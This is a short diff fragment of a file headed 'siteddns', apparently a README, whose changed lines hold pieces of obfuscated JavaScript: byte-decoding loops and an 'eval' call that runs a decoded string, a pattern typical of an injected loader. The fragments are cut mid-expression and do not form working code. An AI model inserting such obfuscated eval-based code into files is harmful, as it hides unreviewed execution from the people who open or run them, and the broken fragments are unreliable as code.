@@ -1,2 +1,2 @@
  # siteddns
->2))-35)&0xff;yo++;}";eval(yo);yo=47;for(;yo>=4;){wo[yo]=((((wo[yo]-96)&0xff)
+=2){qn[sn]=(-((qn[sn]-qn[sn-1])&0xff))&0xff;qn[sn]=(qn[sn]>>5)|((qn[sn]
